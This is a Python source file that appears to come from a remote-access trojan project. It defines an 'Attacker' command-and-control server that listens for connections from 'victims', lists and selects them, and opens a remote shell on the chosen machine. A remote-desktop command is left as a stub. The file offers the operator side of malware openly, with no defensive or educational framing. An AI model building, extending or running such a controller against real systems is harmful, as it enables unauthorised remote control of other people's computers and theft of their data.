import socket
import threading

from src.modlues.CLI.commmad_invoker import CommandInvoker
from src.modlues.CLI.print_enchanter import segement_print
from src.modlues.protocols.victim_dataclass import VictimData
from src.modlues.remote_shell.attacker_rsh import RemoteShellAttackerSide


class Attacker:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.addr = (ip, port)
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(self.addr)

        self.connected_victims = list()

        self.chosen_victim = None

        self.commands = {"showvictims": self.__show_connected_victims,
                         "choose": self.__choose_victim,
                         "rsh": self.__start_remote_shell,
                         "rdp": self.__start_remote_desktop
                         }

        self.command_invoker = CommandInvoker(self.commands)

    def main(self):
        threading.Thread(target=self.__start_listing).start()
        threading.Thread(target=self.__admin_input).start()

    def __start_listing(self):
        print(f'LISTENING... ({self.ip}:{self.port})')
        self.server.listen()
        try:
            while True:
                conn, addr = self.server.accept()
                threading.Thread(target=self.__on_new_client, args=(conn, addr)).start()

        except Exception as e:
            print(e)
            self.server.close()

    def __on_new_client(self, conn, addr):
        self.connected_victims.append(VictimData(conn, addr))

    def __admin_input(self):
        while True:
            if self.chosen_victim:
                input_text = f"{self.chosen_victim.addr} $ "
            else:
                input_text = f"Attacker $ "

            command = input(input_text)

            self.command_invoker.exec(command)

    @segement_print
    def __show_connected_victims(self):
        print("Connected Victims - ")
        for i, client in enumerate(self.connected_victims, start=1):
            print(f'{i}. {client.addr}')

    def __choose_victim(self):
        self.__show_connected_victims()

        victim_id = int(input("Enter Victim Id: "))

        if self.connected_victims[victim_id - 1]:
            self.chosen_victim = self.connected_victims[victim_id - 1]
        else:
            print("Invalid Input")

    def __start_remote_shell(self):
        if self.chosen_victim:
            RemoteShellAttackerSide(self.chosen_victim.conn).main()
        else:
            print("Please Choose Victim, try 'choose'")

    def __start_remote_desktop(self):
        print("feature in development! :(")
